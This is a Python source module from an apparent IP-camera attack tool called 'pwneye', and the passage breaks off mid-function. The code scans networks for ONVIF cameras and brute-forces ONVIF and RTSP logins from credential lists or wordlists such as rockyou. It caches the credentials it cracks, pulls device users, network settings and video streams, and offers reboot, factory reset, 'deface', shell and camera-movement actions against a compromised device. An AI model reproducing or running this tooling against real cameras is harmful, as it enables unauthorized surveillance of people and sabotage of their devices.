import argparse
import queue
import re
import subprocess
import tempfile
import threading
import time
import traceback
from pathlib import Path

from pwneye.core import bootstrap

from pwneye.core.types import ExitCode, PromptInterrupt, Result, RtspAttempt, RtspChannelEntry, RtspProbeResult, TUI, ViewerLaunchOptions, ViewerOnvifContext

from pwneye.core.network import common as netcomm
from pwneye.core.network import interfaces as netifaces
from pwneye.core.network import onvif, rtsp
from pwneye.core import viewer

from pwneye.core.storage import cache as cachedata
from pwneye.core.storage import deface as defacedata
from pwneye.core.storage.media import (
    resolve_recording_path,
    resolve_recording_path_with_notice,
    resolve_snapshot_path,
    resolve_snapshot_path_with_notice,
)
from pwneye.core.storage import onvif as onvifdata
from pwneye.core.storage import rtsp as rtspdata

ONVIF_SCOPE_PREFIX = "onvif://www.onvif.org/"
RTSP_CHANNEL_SELECT_PROMPT = "Select channel (CTRL-C to exit)"
RTSP_OPEN_ALL_CHANNELS_OPTION = "Open all discovered channels in a dedicated client"


def _allow_open_all_channels(args: argparse.Namespace) -> bool:
    """
    Return whether the dedicated multi-channel client should be offered.
    """
    return (
        not args.legacy
        and not args.no_video
        and args.record is None
        and args.snapshot is None
    )

def run(args: argparse.Namespace, tui: TUI) -> ExitCode:
    setattr(args, "_resolved_onvif_port", None)
    init = _initialize_environment(args, tui)
    if not init.ok:
        return init.exit_code

    if args.list_vendors:
        return _list_supported_rtsp_vendors(tui)

    if args.discover is not None:
        return _run_onvif_discovery(args, tui)

    cache_entry = _load_target_cache(args, tui)
    
    if not _check_target_reachability(args, tui):
        return ExitCode.USER_ABORT

    # ONVIF Testing
    onvif_rtsp_streams, manufacturer, onvif_credentials, onvif_post_action_completed = [], None, None, False
    if not args.skip_onvif:
        onvif_kb = onvifdata.load_knowledge_base()
        try:
            onvif_rtsp_streams, manufacturer, onvif_credentials, onvif_post_action_completed = _run_onvif_scan(
                args,
                onvif_kb,
                cache_entry,
                tui,
            )
        except PromptInterrupt:
            raise
        except KeyboardInterrupt:
            if not args.skip_rtsp and not args.reboot and not args.reset and args.deface is None and not args.undeface and not args.shell and args.move is None:
                tui.warning("ONVIF scan interrupted. Continuing with RTSP...")
                onvif_rtsp_streams, manufacturer, onvif_credentials = [], None, None
            else:
                raise

        if args.reboot or args.reset or args.deface is not None or args.undeface or args.shell or args.move is not None:
            return ExitCode.SUCCESS if onvif_post_action_completed else ExitCode.FAILURE
    else:
        tui.warning("Skipping ONVIF as per user request")

    # RTSP Testing
    if not args.skip_rtsp:
        rtsp_kb = rtspdata.load_knowledge_base()

        if args.banner:
            rtsp_ports = _resolve_rtsp_ports(
                host=args.target,
                rtsp_kb=rtsp_kb,
                tui=tui,
                preferred_port=args.rtsp_port,
                onvif_streams=onvif_rtsp_streams,
                timeout=args.rtsp_port_timeout,
            )
            return _print_rtsp_banner(
                args=args,
                cache_entry=cache_entry,
                rtsp_ports=rtsp_ports,
                tui=tui,
            )

        cached_rtsp_ok = _try_cached_rtsp_auth(
            args=args,
            cache_entry=cache_entry,
            onvif_credentials=onvif_credentials,
            tui=tui,
        )
        if cached_rtsp_ok:
            return ExitCode.SUCCESS

        rtsp_ports = _resolve_rtsp_ports(
            host=args.target,
            rtsp_kb=rtsp_kb,
            tui=tui,
            preferred_port=args.rtsp_port,
            onvif_streams=onvif_rtsp_streams,
            timeout=args.rtsp_port_timeout,
        )

        if not rtsp_ports:
            tui.error("No RTSP services discovered. Quitting...")
            return ExitCode.FAILURE

        if not _run_rtsp_scan(
            args=args,
            rtsp_kb=rtsp_kb,
            rtsp_ports=rtsp_ports,
            onvif_streams=onvif_rtsp_streams,
            manufacturer=manufacturer,
            onvif_credentials=onvif_credentials,
            tui=tui,
        ):
            return ExitCode.FAILURE
    else:
        tui.warning("Skipping RTSP as per user request")

    return ExitCode.SUCCESS

def _unique(values: list[str]) -> list[str]:
    """
    Return values without duplicates while preserving the original order.
    """
    seen = set()
    output = []

    for value in values:
        if value in seen:
            continue

        seen.add(value)
        output.append(value)

    return output

def _resolve_credential_values(value: str | None) -> list[str]:
    """
    Resolve a single credential value or load multiple values from a file.

    If `value` points to an existing file, one credential is read from each
    non-empty line. Otherwise the literal value itself is returned.
    None means omitted; an explicit empty string is a single empty credential.
    """
    if value is None:
        return []
    if value == "":
        return [""]

    candidate = Path(value).expanduser()
    if candidate.is_file():
        # Wordlists such as rockyou may contain invalid UTF-8 bytes.
        # Keep scanning instead of aborting on undecodable characters.
        with candidate.open("r", encoding="utf-8", errors="ignore") as handle:
            credentials = []
            for line in handle:
                credential = line.rstrip("\r\n").removeprefix("\ufeff")
                if credential != "":
                    credentials.append(credential)
            return credentials

    return [value]

def _normalize_rtsp_connection_string(value: str) -> str:
    """
    Normalize a user-provided RTSP connection string/path candidate.
    """
    candidate = value.strip()
    if candidate.startswith("rtsp://"):
        candidate = rtsp.parse_rtsp_url(candidate)["path"] or "/"
    if not candidate.startswith("/"):
        candidate = f"/{candidate}"
    return candidate

def _resolve_connection_string_values(value: str) -> list[str]:
    """
    Resolve one or more RTSP connection strings from a literal value or file.
    """
    if not value:
        return []
    return [
        _normalize_rtsp_connection_string(candidate)
        for candidate in _resolve_credential_values(value)
    ]

def _prioritize_rtsp_ports(ports: list[int]) -> list[int]:
    """
    Prioritize the most common RTSP ports before trying rarer ones.
    """
    priority = [
        554,
        8554,
        5544,
        8555,
        10554,
        5554,
        1554,
        7070,
        1935,
    ]

    ordered = []
    seen = set()

    for port in priority:
        if port in ports and port not in seen:
            ordered.append(port)
            seen.add(port)

    for port in ports:
        if port not in seen:
            ordered.append(port)
            seen.add(port)

    return ordered

def _load_target_cache(
    args: argparse.Namespace,
    tui: TUI,
) -> dict | None:
    """
    Load the target cache unless caching has been explicitly disabled.
    """
    if args.no_cache:
        return None

    if args.fresh:
        tui.warning("Ignoring cached data due to --fresh")
        return None

    cache_entry = cachedata.load_target(args.target)
    if cache_entry is None:
        return None

    cached_protocols = []
    has_cached_onvif_auth = cachedata.get_cached_onvif_auth(cache_entry) is not None
    has_cached_rtsp_auth = cachedata.get_cached_rtsp_auth(cache_entry) is not None

    if not args.skip_onvif and has_cached_onvif_auth:
        cached_protocols.append("ONVIF")
    if not args.skip_rtsp and has_cached_rtsp_auth:
        cached_protocols.append("RTSP")

    if cached_protocols:
        tui.info(
            "Found cached {protocols} credential(s) for {target}",
            protocols="/".join(cached_protocols),
            target=args.target,
        )
        if has_cached_onvif_auth and not args.skip_onvif and (args.onvif_username is not None or args.onvif_password is not None):
            tui.warning("Ignoring cached ONVIF credentials because explicit ONVIF credentials were provided")
        if has_cached_rtsp_auth and not args.skip_rtsp and (args.username is not None or args.password is not None):
            tui.warning("Ignoring cached RTSP credentials because explicit RTSP credentials were provided")

    return cache_entry

def _initialize_environment(args: argparse.Namespace, tui: TUI) -> Result:
    if args.reboot and args.skip_onvif:
        tui.error("Cannot use --reboot together with --skip-onvif")
        return Result(ok=False, exit_code=ExitCode.FAILURE)
    if args.reset and args.skip_onvif:
        tui.error("Cannot use --reset together with --skip-onvif")
        return Result(ok=False, exit_code=ExitCode.FAILURE)
    if args.deface is not None and args.skip_onvif:
        tui.error("Cannot use --deface together with --skip-onvif")
        return Result(ok=False, exit_code=ExitCode.FAILURE)
    if args.undeface and args.skip_onvif:
        tui.error("Cannot use --undeface together with --skip-onvif")
        return Result(ok=False, exit_code=ExitCode.FAILURE)
    if args.shell and args.skip_onvif:
        tui.error("Cannot use --shell together with --skip-onvif")
        return Result(ok=False, exit_code=ExitCode.FAILURE)
    if args.move is not None and args.skip_onvif:
        tui.error("Cannot use --move together with --skip-onvif")
        return Result(ok=False, exit_code=ExitCode.FAILURE)
    if args.reboot and args.reset:
        tui.error("Cannot use --reboot together with --reset")
        return Result(ok=False, exit_code=ExitCode.FAILURE)
    if args.deface is not None and args.reboot:
        tui.error("Cannot use --deface together with --reboot")
        return Result(ok=False, exit_code=ExitCode.FAILURE)
    if args.deface is not None and args.reset:
        tui.error("Cannot use --deface together with --reset")
        return Result(ok=False, exit_code=ExitCode.FAILURE)
    if args.undeface and args.reboot:
        tui.error("Cannot use --undeface together with --reboot")
        return Result(ok=False, exit_code=ExitCode.FAILURE)
    if args.undeface and args.reset:
        tui.error("Cannot use --undeface together with --reset")
        return Result(ok=False, exit_code=ExitCode.FAILURE)
    if args.undeface and args.deface is not None:
        tui.error("Cannot use --undeface together with --deface")
        return Result(ok=False, exit_code=ExitCode.FAILURE)
    if args.shell and args.reboot:
        tui.error("Cannot use --shell together with --reboot")
        return Result(ok=False, exit_code=ExitCode.FAILURE)
    if args.shell and args.reset:
        tui.error("Cannot use --shell together with --reset")
        return Result(ok=False, exit_code=ExitCode.FAILURE)
    if args.shell and args.deface is not None:
        tui.error("Cannot use --shell together with --deface")
        return Result(ok=False, exit_code=ExitCode.FAILURE)
    if args.shell and args.undeface:
        tui.error("Cannot use --shell together with --undeface")
        return Result(ok=False, exit_code=ExitCode.FAILURE)
    if args.move is not None and args.reboot:
        tui.error("Cannot use --move together with --reboot")
        return Result(ok=False, exit_code=ExitCode.FAILURE)
    if args.move is not None and args.reset:
        tui.error("Cannot use --move together with --reset")
        return Result(ok=False, exit_code=ExitCode.FAILURE)
    if args.move is not None and args.deface is not None:
        tui.error("Cannot use --move together with --deface")
        return Result(ok=False, exit_code=ExitCode.FAILURE)
    if args.move is not None and args.undeface:
        tui.error("Cannot use --move together with --undeface")
        return Result(ok=False, exit_code=ExitCode.FAILURE)
    if args.move is not None and args.shell:
        tui.error("Cannot use --move together with --shell")
        return Result(ok=False, exit_code=ExitCode.FAILURE)
    first_run = bootstrap.is_first_run()
    if first_run:
        tui.info("First execution detected, initializing pwneye...")

    # Runtime dirs
    pwneye_path, cache_path, recordings_path, snapshots_path = bootstrap.ensure_runtime_dirs()

    if pwneye_path:
        tui.info2("Runtime directory initialized ({path})", path=pwneye_path)
    if cache_path:
        tui.info2("Cache directory initialized ({path})", path=cache_path)
    if recordings_path:
        tui.info2("Recordings directory initialized ({path})", path=recordings_path)
    if snapshots_path:
        tui.info2("Snapshots directory initialized ({path})", path=snapshots_path)

    if first_run:
        required_paths = [
            bootstrap.PWNEYE_DIR,
            bootstrap.CACHE_DIR,
            bootstrap.RECORDINGS_DIR,
            bootstrap.SNAPSHOTS_DIR,
        ]
        if all(path.exists() and path.is_dir() for path in required_paths):
            tui.success("pwneye was initialized successfully")
        else:
            tui.error("pwneye initialization did not complete successfully")
            return Result(ok=False, exit_code=ExitCode.FAILURE)

    # External dependencies
    dependencies = []
    onvif_only_action = bool(
        args.reboot
        or args.reset
        or args.deface is not None
        or args.undeface
        or args.shell
        or args.move is not None
    )
    if args.discover is None and not args.skip_rtsp and not onvif_only_action:
        dependencies = ["ffprobe"]

        if (
            args.record is not None
            or args.snapshot is not None
            or (not args.no_video and not args.legacy)
        ):
            dependencies.append("ffmpeg")

        if (args.record is not None and not args.no_video) or (
            args.legacy and not args.no_video
        ):
            dependencies.append("ffplay")

    if dependencies:
        ok, missing = bootstrap.check_dependencies(dependencies)
        if not ok:
            package_hint = " (Package: ffmpeg)" if any(dep in {"ffplay", "ffprobe", "ffmpeg"} for dep in missing) else ""
            missing_list = ", ".join(missing)
            tui.error(f"Missing required dependencies. Please install: {missing_list}{package_hint}")
            return Result(ok=False, exit_code=ExitCode.FAILURE)

    # --- Knowledge bases sanity check ---

    onvif_kb, rtsp_kb = None, None

    if not args.skip_onvif or args.discover is not None:
        try:
            onvif_kb = onvifdata.load_knowledge_base()
        except Exception as exc:
            if args.discover is not None:
                onvif_kb = None
            else:
                tui.warning("Unable to load ONVIF knowledge base. ONVIF testing will be skipped.")
                args.skip_onvif = True

    if not args.skip_rtsp:
        try:
            rtsp_kb = rtspdata.load_knowledge_base()
        except Exception as exc:
            tui.warning("Unable to load RTSP knowledge base. RTSP testing will be skipped.")
            args.skip_rtsp = True

    # --- CLI variables checks ---

    if args.list_vendors:
        return Result(ok=True, exit_code=ExitCode.SUCCESS)

    if not args.skip_rtsp and args.vendor:
        if not rtspdata.is_vendor_in_db(args.vendor, rtsp_kb):
            tui.warning(
                "The specified RTSP vendor was not found in the knowledge base: {vendor}",
                vendor=args.vendor,
            )
            tui.info("Use --list-vendors to show the supported RTSP vendors")
            args.vendor = None

    return Result(ok=True, exit_code=ExitCode.SUCCESS)

def _list_supported_rtsp_vendors(tui: TUI) -> ExitCode:
    """
    Print the supported RTSP vendors and exit.
    """
    try:
        rtsp_kb = rtspdata.load_knowledge_base()
    except Exception:
        tui.error("Unable to load the RTSP knowledge base")
        return ExitCode.FAILURE

    vendors = rtspdata.get_all_vendors(rtsp_kb)
    if not vendors:
        tui.warning("No RTSP vendors are currently available in the knowledge base")
        return ExitCode.FAILURE

    tui.success("Loaded {count} RTSP vendor(s) from the knowledge base", count=len(vendors))
    tui.block(vendors)
    return ExitCode.SUCCESS


def _run_onvif_discovery(args: argparse.Namespace, tui: TUI) -> ExitCode:
    """
    Continuously discover ONVIF devices on the target network and print only new results.
    """
    tui.info("Starting continuous ONVIF discovery on the target network")

    all_interfaces = str(args.discover).lower() == "all"
    if all_interfaces:
        selections = netifaces.list_discovery_interfaces()
        if not selections:
            tui.error("No IPv4 network interfaces are available for ONVIF discovery")
            return ExitCode.FAILURE
        tui.info("Network interfaces identified for ONVIF discovery:")
        tui.block({
            selection.name: netifaces.format_interface_subnet(selection) or "Subnet unavailable"
            for selection in selections
        })
        tui.info("Cycling through {count} network interface(s) until CTRL-C", count=len(selections))
    elif args.discover == "":
        selection = netifaces.get_default_interface()
        selection_subnet = netifaces.format_interface_subnet(selection)
        if selection.name and selection.ipv4:
            if selection_subnet:
                tui.warning(
                    "No network interface was specified. Using {interface} (subnet {subnet}) for discovery",
                    interface=selection.name,
                    subnet=selection_subnet,
                )
            else:
                tui.warning(
                    "No network interface was specified. Using {interface} for discovery",
                    interface=selection.name,
                )
        elif selection.ipv4:
            tui.warning(
                "No network interface was specified. Using the default local interface for discovery",
            )
        else:
            tui.warning("No network interface was specified. Letting the OS choose one automatically")
    else:
        selection = netifaces.resolve_interface_selection(str(args.discover))
        if selection.ipv4 is None:
            tui.error("Unable to resolve the IPv4 address for network interface {interface}", interface=args.discover)
            return ExitCode.FAILURE

        selection_subnet = netifaces.format_interface_subnet(selection)
        if selection_subnet:
            tui.info(
                "Using network interface {interface} (subnet {subnet}) for ONVIF discovery",
                interface=selection.name or str(args.discover),
                subnet=selection_subnet,
            )
        else:
            tui.info(
                "Using network interface {interface} for ONVIF discovery",
                interface=selection.name or str(args.discover),
            )
    if not all_interfaces:
        selections = [selection]
    discovered_devices: dict[tuple, dict] = {}
    iteration = 0

    tui.start_live("Discovering ONVIF devices on the target network (pass 1) - CTRL-C to stop...")

    try:
        while True:
            index = iteration % len(selections)
            pass_count = iteration // len(selections) + 1
            selection = selections[index]
            discovery_interface_ip = selection.ipv4
            network_label = "the target network"
            if all_interfaces:
                subnet = netifaces.format_interface_subnet(selection)
                network_label = f"{selection.name}" + (f" (subnet {subnet})" if subnet else "")
                network_label += f" [{index + 1}/{len(selections)}]"
            tui.update_live(
                f"Discovering ONVIF devices on {network_label} (pass {pass_count}) - CTRL-C to stop..."
            )
            iteration += 1
            try:
                devices = onvif.discover(interface=discovery_interface_ip)
            except Exception as exc:
                tui.warning("Discovery failed on {interface}: {error}", interface=selection.name or "default interface", error=str(exc))
                devices = []

            new_devices = []
            for device in devices:
                key = (
                    selection.name, selection.ipv4,
                    str(device.get("host") or ""),
                    str(device.get("port") or ""),
                    tuple(sorted(device.get("xaddrs", []))),
                )
                if key in discovered_devices:
                    continue

                if all_interfaces:
                    device = dict(device, discovery_interface=selection.name)
                discovered_devices[key] = device
                new_devices.append(device)

            if new_devices:
                tui.success(
                    "Discovered {count} new ONVIF device(s) on the target network",
                    count=len(new_devices),
                )

                for device in new_devices:
                    host = device.get("host") or ""
                    manufacturer = _parse_onvif_scopes(device.get("scopes", [])).get("Manufacturer")

                    if not args.no_cache:
                        cachedata.upsert_onvif_discovery(
                            host,
                            manufacturer=manufacturer,
                        )
                        if host and manufacturer:
                            tui.info2(
                                "Saved ONVIF discovery data to cache for {host} ({manufacturer})",
                                host=host,
                                manufacturer=manufacturer,
                            )
                        elif host:
                            tui.info2(
                                "Saved ONVIF discovery data to cache for {host}",
                                host=host,
                            )

                    _print_onvif_discovery_device(device, tui)

            if iteration % len(selections) == 0:
                time.sleep(2)
    except KeyboardInterrupt:
        tui.stop_live()
        if discovered_devices:
            tui.success(
                "ONVIF discovery stopped by user after identifying {count} device(s)",
                count=len(discovered_devices),
            )
            return ExitCode.SUCCESS

        tui.warning("ONVIF discovery stopped by user before any device was identified")
        return ExitCode.USER_ABORT

def _print_onvif_discovery_device(device: dict, tui: TUI) -> None:
    """
    Render a discovered ONVIF device block.
    """
    protocol = "https" if device.get("use_https") else "http"
    parsed_scopes = _parse_onvif_scopes(device.get("scopes", []))

    block = {
        "Host": device.get("host") or "(unknown)",
        "Port": device.get("port") or "(unknown)",
        "Protocol": protocol,
        "Types": _format_onvif_types(device.get("types", [])),
        "XAddrs": ", ".join(device.get("xaddrs", [])),
    }
    if device.get("discovery_interface"):
        block["Interface"] = device["discovery_interface"]

    for field in (
        "Manufacturer",
        "Name",
        "Hardware",
        "MAC",
        "Country",
        "Profiles",
        "Capabilities",
        "Other scopes",
    ):
        value = parsed_scopes.get(field)
        if value:
            block[field] = value

    tui.block(block)

def _format_onvif_types(types: list[str]) -> str:
    """
    Normalize ONVIF types for a cleaner discovery output.
    """
    normalized = []

    for item in types:
        value = item.split(":")[-1].strip()
        if value:
            normalized.append(value)

    return ", ".join(_unique(normalized))

def _parse_onvif_scopes(scopes: list[str]) -> dict[str, str]:
    """
    Extract the most useful information from ONVIF discovery scopes.
    """
    parsed = {
        "Manufacturer": "",
        "Name": "",
        "Hardware": "",
        "MAC": "",
        "Country": "",
        "Profiles": "",
        "Capabilities": "",
        "Other scopes": "",
    }

    profiles = []
    capabilities = []
    other_scopes = []

    for scope in scopes:
        value = scope.strip()
        if not value:
            continue

        if value.startswith(ONVIF_SCOPE_PREFIX):
            value = value[len(ONVIF_SCOPE_PREFIX):]

        parts = [part for part in value.split("/") if part]
        if not parts:
            continue

        head = parts[0].lower()

        if head == "manufacturer" and len(parts) >= 2:
            parsed["Manufacturer"] = parts[-1]
            continue

        if head == "name" and len(parts) >= 2:
            parsed["Name"] = parts[-1]
            continue

        if head == "hardware" and len(parts) >= 2:
            parsed["Hardware"] = parts[-1]
            continue

        if head == "mac" and len(parts) >= 2:
            parsed["MAC"] = parts[-1]
            continue

        if head == "profile" and len(parts) >= 2:
            profiles.append(parts[-1])
            continue

        if head == "type" and len(parts) >= 2:
            capabilities.append(parts[-1])
            continue

        if head == "location" and len(parts) >= 3 and parts[1].lower() == "country":
            parsed["Country"] = parts[-1]
            continue

        other_scopes.append(value)

    parsed["Profiles"] = ", ".join(_unique(profiles))
    parsed["Capabilities"] = ", ".join(_unique(capabilities))
    parsed["Other scopes"] = ", ".join(_unique(other_scopes))

    return parsed
    
def _check_target_reachability(args: argparse.Namespace, tui: TUI) -> bool:
    if args.skip_reachability:
        tui.warning("Skipping the initial reachability check as requested")
        return True
    tui.info("Checking if the target ({target}) is reachable...", target=args.target)

    try:
        reachable = netcomm.is_host_reachable(args.target)
    except KeyboardInterrupt:
        tui.console.file.write("\r\033[2K")
        tui.console.file.flush()
        reachable = False

    if reachable:
        tui.info2("The target seems to be reachable")
        return True

    tui.warning(
        "{target} does not appear to be reachable, or ICMP traffic is being filtered",
        target=args.target,
    )

    return tui.confirm("Do you want to proceed anyway?")

# ----------------------------------------
# ONVIF
# ----------------------------------------

def _run_onvif_scan(
    args: argparse.Namespace,
    onvif_kb: dict,
    cache_entry: dict | None,
    tui: TUI
) -> tuple[list[str], str | None, tuple[str, str] | None, bool]:
    """
    Complete ONVIF scanning workflow (opportunistic).

    Returns:
        (rtsp_streams, manufacturer, credentials, reboot_completed)
    """

    camera = None
    credentials = None
    successful_port = None
    responsive_onvif_ports: list[int] | None = None
    extend_onvif_to_common = False
    used_cached_onvif_auth = False
    rtsp_onvif_usernames, rtsp_onvif_passwords = _rtsp_credentials_not_tested_via_onvif(args, onvif_kb)

    cached_onvif_auth = None
    if args.onvif_username is None and args.onvif_password is None:
        cached_onvif_auth = cachedata.get_cached_onvif_auth(cache_entry)

    if cached_onvif_auth:
        tui.info(
            "Checking whether the target supports ONVIF on port {port}...",
            port=cached_onvif_auth["port"],
        )
        camera, credentials, successful_port, responsive_onvif_ports = _attempt_onvif_login(
            args=args,
            ports=[cached_onvif_auth["port"]],
            usernames=[cached_onvif_auth["username"]],
            passwords=[cached_onvif_auth["password"]],
            tui=tui,
            live_label="Trying cached ONVIF credentials...",
            auth_label="Trying cached ONVIF credentials for the target...",
        )

        if camera is not None:
            used_cached_onvif_auth = True
        else:
            tui.warning("Cached ONVIF credentials are no longer valid")

    # ---------- FIRST ATTEMPT: user-provided credentials ----------
    if camera is None and (args.onvif_username is not None or args.onvif_password is not None):
        auth_hint = None
        if args.onvif_username is not None and args.onvif_password is None:
            auth_hint = "Only ONVIF username provided, testing common passwords"
        elif args.onvif_username is None and args.onvif_password is not None:
            auth_hint = "Only ONVIF password provided, testing common usernames"

        camera, credentials, successful_port, responsive_onvif_ports = _detect_onvif_camera(
            args,
            onvif_kb,
            tui,
            responsive_ports=responsive_onvif_ports,
            auth_label="Trying ONVIF authentication using user-provided credentials...",
            auth_hint=auth_hint,
        )

        if camera is None:
            tui.warning("Unable to authenticate via ONVIF using provided credentials")
            if not tui.confirm("Do you want to extend the test to common ONVIF credentials?"):
                return [], None, None, False

            extend_onvif_to_common = True

            # Clear forced credentials to allow full KB usage
            args.onvif_username = None
            args.onvif_password = None

    # ---------- SECOND ATTEMPT: common credentials ----------
    if camera is None:
        if extend_onvif_to_common:
            auth_label = "Extending ONVIF authentication to common credentials..."
        else:
            auth_label = "Trying ONVIF authentication using common username(s) and password(s)..."

        camera, credentials, successful_port, responsive_onvif_ports = _detect_onvif_camera(
            args,
            onvif_kb,
            tui,
            responsive_ports=responsive_onvif_ports,
            auth_label=auth_label,
        )

        if camera is None and (rtsp_onvif_usernames or rtsp_onvif_passwords):
            if tui.confirm("ONVIF authentication failed with the common credential pool. Try the RTSP credentials too?", default=False):
                ports = responsive_onvif_ports or ([args.onvif_port] if args.onvif_port else onvif_kb["ports"])
                usernames = rtsp_onvif_usernames or onvif_kb["usernames"]
                passwords = rtsp_onvif_passwords or onvif_kb["passwords"]

                camera, credentials, successful_port, responsive_onvif_ports = _attempt_onvif_login(
                    args=args,
                    ports=ports,
                    usernames=usernames,
                    passwords=passwords,
                    tui=tui,
                    live_label="Trying RTSP credentials against ONVIF...",
                    responsive_ports=responsive_onvif_ports,
                )

        if camera is None:
            tui.warning("ONVIF detection failed (service not supported or authentication failed)")
            return [], None, None, False

    if args.reboot:
        _persist_onvif_cache_entry(
            args=args,
            port=successful_port,
            credentials=credentials,
            manufacturer=None,
            streams=None,
            tui=tui,
            announce=not used_cached_onvif_auth,
        )
        reboot_completed = _reboot_onvif_camera(args, camera, tui)
        return [], None, credentials, reboot_completed

    if args.reset:
        _persist_onvif_cache_entry(
            args=args,
            port=successful_port,
            credentials=credentials,
            manufacturer=None,
            streams=None,
            tui=tui,
            announce=not used_cached_onvif_auth,
        )
        reset_completed = _reset_onvif_camera(args, camera, tui)
        return [], None, credentials, reset_completed

    if args.deface is not None:
        _persist_onvif_cache_entry(
            args=args,
            port=successful_port,
            credentials=credentials,
            manufacturer=None,
            streams=None,
            tui=tui,
            announce=not used_cached_onvif_auth,
        )
        deface_completed = _deface_onvif(args.target, camera, args.deface, tui)
        return [], None, credentials, deface_completed

    if args.undeface:
        _persist_onvif_cache_entry(
            args=args,
            port=successful_port,
            credentials=credentials,
            manufacturer=None,
            streams=None,
            tui=tui,
            announce=not used_cached_onvif_auth,
        )
        undeface_completed = _undeface_onvif(args.target, camera, tui)
        return [], None, credentials, undeface_completed

    if args.shell:
        _persist_onvif_cache_entry(
            args=args,
            port=successful_port,
            credentials=credentials,
            manufacturer=None,
            streams=None,
            tui=tui,
            announce=not used_cached_onvif_auth,
        )
        shell_completed = _open_onvif_shell(
            camera,
            args.target,
            successful_port,
            credentials,
            tui,
        )
        return [], None, credentials, shell_completed

    if args.move is not None:
        _persist_onvif_cache_entry(
            args=args,
            port=successful_port,
            credentials=credentials,
            manufacturer=None,
            streams=None,
            tui=tui,
            announce=not used_cached_onvif_auth,
        )
        move_completed = _move_onvif_camera(
            camera,
            args.move,
            tui,
        )
        return [], None, credentials, move_completed

    # ---------- EXTRACTION PHASE ----------
    manufacturer = _extract_device_info(camera, tui)
    _extract_onvif_users(camera, tui)
    _extract_network_config(camera, tui)
    _extract_media_profiles(camera, tui)
    _extract_snapshot_uris(camera, tui)

    streams = _extract_rtsp_streams(camera, tui)
    _extract_onvif_capabilities(camera, tui)

    _persist_onvif_cache_entry(
        args=args,
        port=successful_port,
        credentials=credentials,
        manufacturer=manufacturer,
        streams=streams or [],
        tui=tui,
        announce=not used_cached_onvif_auth,
    )
    setattr(args, "_resolved_onvif_port", successful_port)

    return streams or [], manufacturer, credentials, False

def _resolve_onvif_targets(args, kb):
    """
    Resolve ONVIF ports and credentials to test.

    CLI-provided values (if any) are used exclusively.
    Otherwise, defaults from the ONVIF knowledge base are used.

    Returns:
        (ports, usernames, passwords)
    """
    ports = [args.onvif_port] if args.onvif_port else kb["ports"]
    usernames = _resolve_credential_values(args.onvif_username) if args.onvif_username is not None else kb["usernames"]
    passwords = _resolve_credential_values(args.onvif_password) if args.onvif_password is not None else kb["passwords"]

    return ports, usernames, passwords


def _format_onvif_auth_label(
    base_label: str | None,
    *,
    ports: list[int],
    usernames: list[str],
    passwords: list[str],
    threads: int,
) -> str | None:
    """
    Build a concise ONVIF brute-force summary, similar to RTSP.
    """
    if base_label is None:
        return None

    attempts = len(ports) * len(usernames) * len(passwords)
    thread_count = max(1, min(threads, attempts or 1))

    lowered = base_label.lower()
    qualifier = ""
    if "cached" in lowered:
        qualifier = " using cached credentials"
    elif "user-provided" in lowered:
        qualifier = " using user-provided credentials"
    elif "rtsp credentials" in lowered:
        qualifier = " using RTSP credentials"

    return (
        "Trying {attempts} ONVIF combination(s){qualifier} across {ports} port(s), "
        "{usernames} username(s), {passwords} password(s) and {threads} thread(s)..."
    ).format(
        attempts=attempts,
        qualifier=qualifier,
        ports=len(ports),
        usernames=len(usernames),
        passwords=len(passwords),
        threads=thread_count,
    )

def _rtsp_credentials_not_tested_via_onvif(
    args: argparse.Namespace,
    onvif_kb: dict,
) -> tuple[list[str], list[str]]:
    """
    Return RTSP credentials that were not already covered by ONVIF testing.
    """
    rtsp_usernames = _resolve_credential_values(args.username)
    rtsp_passwords = _resolve_credential_values(args.password)

    if not rtsp_usernames and not rtsp_passwords:
        return [], []

    tested_usernames = set(onvif_kb["usernames"])
    tested_passwords = set(onvif_kb["passwords"])

    remaining_usernames = [value for value in rtsp_usernames if value not in tested_usernames]
    remaining_passwords = [value for value in rtsp_passwords if value not in tested_passwords]

    if rtsp_usernames and not rtsp_passwords:
        return remaining_usernames, []

    if rtsp_passwords and not rtsp_usernames:
        return [], remaining_passwords

    if rtsp_usernames and rtsp_passwords:
        if remaining_usernames or remaining_passwords:
            return rtsp_usernames, rtsp_passwords

    return [], []

def _detect_onvif_camera(
    args: argparse.Namespace,
    onvif_kb: dict,
    tui: TUI,
    responsive_ports: list[int] | None = None,
    auth_label: str | None = None,
    auth_hint: str | None = None,
) -> tuple[object | None, tuple[str, str] | None, int | None, list[int] | None]:
    """
    Detect and authenticate to ONVIF camera.
    
    Returns:
        (camera, credentials) if successful, (None, None) otherwise
    """
    ports, usernames, passwords = _resolve_onvif_targets(args, onvif_kb)

    if responsive_ports is None:
        if args.onvif_port:
            tui.info(
                "Testing user-specified ONVIF port {target}:{port}",
                target=args.target,
                port=args.onvif_port,
            )
        elif ports == onvif_kb["ports"]:
            tui.info("Testing common ONVIF ports from knowledge base")

    return _attempt_onvif_login(
        args=args,
        ports=ports,
        usernames=usernames,
        passwords=passwords,
        tui=tui,
        responsive_ports=responsive_ports,
        auth_label=auth_label,
        auth_hint=auth_hint,
    )

def _attempt_onvif_login(
    args: argparse.Namespace,
    ports: list[int],
    usernames: list[str],
    passwords: list[str],
    tui: TUI,
    live_label: str = "Preparing ONVIF bruteforce...",
    responsive_ports: list[int] | None = None,
    auth_label: str | None = None,
    auth_hint: str | None = None,
) -> tuple[object | None, tuple[str, str] | None, int | None, list[int] | None]:
    """
    Try ONVIF authentication using the provided ports and credentials.
    """
    auth_label_printed = False
    auth_hint_printed = False
    auth_label = _format_onvif_auth_label(
        auth_label,
        ports=ports,
        usernames=usernames,
        passwords=passwords,
        threads=args.threads,
    )

    def print_auth_label() -> None:
        nonlocal auth_label_printed
        if auth_label is None or auth_label_printed:
            return

        tui.info(auth_label)
        auth_label_printed = True

    def print_auth_hint() -> None:
        nonlocal auth_hint_printed
        if auth_hint is None or auth_hint_printed:
            return

        tui.warning(auth_hint)
        auth_hint_printed = True

    def on_port_check(port: int) -> None:
        tui.update_live(
            "Checking ONVIF on {target}:{port}...".format(
                port=port,
                target=args.target,
            )
        )

    def on_port_detected(port: int) -> None:
        tui.success(
            "{target} supports ONVIF on port {port}",
            target=args.target,
            port=port,
        )
        print_auth_label()
        print_auth_hint()

    def on_progress(completed: int, total: int, port: int, username: str, password: str) -> None:
        tui.update_attempt_progress(
            completed, total,
            "Trying ONVIF on {target}:{port} with {username}:{password}".format(
                port=port,
                username=username or "(empty)",
                password=password or "(empty)",
                target=args.target,
            )
        )

    if responsive_ports:
        print_auth_label()
        print_auth_hint()

    tui.start_live(live_label)
    try:
